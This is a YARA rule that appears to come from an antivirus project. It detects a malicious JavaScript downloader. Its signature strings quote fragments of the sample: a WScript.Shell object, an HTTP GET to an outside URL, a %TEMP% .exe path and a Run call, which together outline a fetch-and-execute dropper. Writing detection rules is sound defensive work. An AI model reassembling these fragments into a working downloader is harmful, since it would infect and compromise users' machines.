rule sig_20160328_c6e85e1a73f02f92be5d8f7915454d1c {
  meta:
    description = "datamaliciousorder - file 20160328_c6e85e1a73f02f92be5d8f7915454d1c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "17abffea513e38aaa2481501bf4f167e6d299c38b568ce590f2900cde9e904e8"

  strings:
    $s1  = "function Rignl() {return Xlvnyjhvdu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"DZMjGl9U5J.exe\";};" fullword ascii
    $s2  = "do {WScript[Cjonczkw](Aadyhicxwf() * 11)} while (Luwtlnm[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Xlvnyjhvdu = function Jbvjj() {return WScript[Lzgga](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Luwtlnm[Jqwvf](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "function Yfolpyjr(Xguravwzn, Afvgdctgan){return Xguravwzn - Afvgdctgan;};" fullword ascii
    $s6  = "function Mtxmr(Gmaczhurvr){Xlvnyjhvdu[\"Run\"](Gmaczhurvr, Imoiii, Imoiii);};" fullword ascii
    $s7  = "function Vpziey() {return ((Nnhjm == true) && (Nnhjm == Sofegfwxbk)) ? 1 : Imoiii;};" fullword ascii
    $s8  = " while (Yzfrjm){" fullword ascii
    $s9  = "function Aadyhicxwf(){return 22;};" fullword ascii
    $s10 = "var Tqzrumqs = false;" fullword ascii
    $s11 = "function Mlcgokjv(){return Grffod;};" fullword ascii
    $s12 = "function Etbxollviw(){return Lzgga;};" fullword ascii
    $s13 = "return Yfolpyjr(Lgidygkpj, Xvplj);" fullword ascii
    $s14 = "Nnhjm = true; " fullword ascii
    $s15 = "function Ahnbicim(Skbdtbzt) {var Ybrvh = (1, 2, 3, 4, 5, Skbdtbzt); return Ybrvh;};" fullword ascii
    $s16 = "function Rtwqpmz()" fullword ascii
    $s17 = "var Etplqt = new this[\"Date\"]();" fullword ascii
    $s18 = "var Nnhjm = false;" fullword ascii
    $s19 = "var Sofegfwxbk = false;" fullword ascii
    $s20 = "Sofegfwxbk = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}